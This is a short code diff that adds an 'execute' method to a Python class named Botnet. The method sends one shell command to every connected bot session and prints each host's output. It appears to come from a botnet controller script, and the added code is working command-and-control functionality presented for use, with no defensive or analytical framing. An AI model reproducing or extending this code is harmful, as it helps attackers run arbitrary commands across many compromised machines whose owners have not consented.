@@ -69,3 +69,13 @@ class Botnet:
                 print(f"    - {client.host} as {client.user}")
         else:
             print("[-] No bots connected.")
+
+    def execute(self, command):
+        if self.clients:
+            print("[+] Executing command on all bots:")
+            for client in self.clients:
+                client.session.sendline(command)
+                client.session.prompt()
+                print(f'{client.user}@{client.host}: {client.session.before.decode()}')
+        else:
+            print("[-] No bots connected.")
